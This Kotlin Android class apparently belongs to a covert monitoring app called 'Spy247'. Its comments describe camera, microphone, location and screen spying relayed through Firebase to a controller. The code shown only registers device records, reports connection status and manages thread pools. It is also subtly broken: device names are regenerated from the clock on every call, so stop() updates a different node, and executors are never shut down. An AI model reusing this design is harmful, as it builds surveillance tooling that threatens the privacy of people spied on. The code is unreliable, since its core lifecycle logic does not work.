package com.spy247.app

import android.content.Context
import android.hardware.camera2.CameraCharacteristics
import android.util.Log
import com.google.firebase.database.*
import java.io.File
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors

/**
 * Main App class handling all the spy logic - camera, mic, location, screen mirroring
 * Enhanced with Firebase real-time sync for controller screen updates
 */
class App(context: Context) {
    
    private val context = context.applicationContext
    private var isRunning = false
    
    // Firebase Database instance
    private lateinit var database: FirebaseDatabase
    
    // Map to track active stream executors for better lifecycle management
    private val streamExecutors = ConcurrentHashMap<String, java.util.concurrent.ExecutorService>()
    
    companion object {
        const val TAG = "Spy247App"
        const val DB_ROOT_NODE = "/app/spy247"
        
        // Camera stream buffer size (for 30fps at 640x480)
        const val CAMERA_BUFFER_SIZE = 150_000
        
        // Heartbeat interval for WiFi disconnection detection
        const val HEARTBEAT_INTERVAL_MS = 5000L
        
        // Screen mirroring buffer size
        const val SCREEN_BUFFER_SIZE = 200_000
        
        // Default thread pool size for streams
        const val THREAD_POOL_SIZE = 4
        
        // Firebase real-time sync settings
        const val SYNC_INTERVAL_MS = 1000L
    }
    
    init {
        database = FirebaseDatabase.getInstance()
        
        // Set up connection state listener to handle reconnection scenarios
        database.getReference().addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (isRunning && snapshot.exists() == true) {
                    Log.d(TAG, "Firebase connection stable")
                    updateConnectionStatus(true)
                } else if (!snapshot.exists() && isRunning) {
                    Log.w(TAG, "Firebase connection lost")
                    updateConnectionStatus(false)
                }
            }
            
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase connection error", error.toException())
                updateConnectionStatus(false)
            }
        })
        
        // Listen to the main device node for real-time updates
        val deviceNode = database.getReference(DB_ROOT_NODE).child("devices")
        deviceNode.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    Log.d(TAG, "Device found in Firebase: ${snapshot.key}")
                } else {
                    Log.d(TAG, "Firebase initialized - waiting for device registration")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Error checking device", error.toException())
                Log.d(TAG, "Firebase initialized - waiting for device registration")
            }
        })
    }
    
    /**
     * Start the app and establish connection to Firebase
     */
    fun start(mode: DeviceMode) {
        if (isRunning) return
        
        isRunning = true
        val deviceName = context.packageName + "_" + System.currentTimeMillis()
        
        // Create unique node for this device in Firebase with rich metadata
        database.getReference(DB_ROOT_NODE).child("devices").child(deviceName).setValue(mapOf(
            "mode" to mode.name,
            "device_id" to deviceName.lowercase(),
            "timestamp" to System.currentTimeMillis(),
            "status" to "active",
            "version" to "2.0", // Version for tracking updates
            "last_sync" to System.currentTimeMillis()
        ))
        
        Log.d(TAG, "Device started in mode: ${mode.name}")
    }
    
    /**
     * Stop the app and clean up Firebase nodes
     */
    fun stop() {
        if (!isRunning) return
        
        isRunning = false
        
        // Update status to 'stopped' before cleanup
        val deviceName = context.packageName + "_" + System.currentTimeMillis()
        database.getReference(DB_ROOT_NODE).child("devices").child(deviceName).setValue(mapOf(
            "status" to "stopped",
            "last_sync" to System.currentTimeMillis()
        ))
        
        Log.d(TAG, "Device stopped")
    }
    
    /**
     * Get the current device name from Firebase (useful for controller mode)
     */
    fun getDeviceName(): String {
        return context.packageName + "_" + System.currentTimeMillis()
    }
    
    /**
     * Helper to start a named stream executor with proper lifecycle management
     */
    private fun startStreamExecutor(name: String, threadCount: Int = THREAD_POOL_SIZE) {
        val executor = Executors.newFixedThreadPool(threadCount)
        streamExecutors[name] = executor
        Log.d(TAG, "Started stream executor: $name")
    }
    
    /**
     * Helper to stop a named stream executor
     */
    private fun stopStreamExecutor(name: String) {
        if (streamExecutors.remove(name) != null) {
            // Give threads time to finish
            java.util.concurrent.TimeUnit.SECONDS.sleep(1)
            Log.d(TAG, "Stopped stream executor: $name")
        }
    }
    
    /**
     * Check if app is currently running
     */
    fun isRunning(): Boolean = isRunning
    
    /**
     * Get all active stream executors for debugging
     */
    fun getActiveStreams(): Map<String, java.util.concurrent.ExecutorService> = streamExecutors.toMap()
    
    /**
     * Update connection status in Firebase (for controller UI)
     */
    private fun updateConnectionStatus(isConnected: Boolean) {
        database.getReference(DB_ROOT_NODE).child("connection_status").setValue(mapOf(
            "connected" to isConnected,
            "timestamp" to System.currentTimeMillis()
        ))
    }
}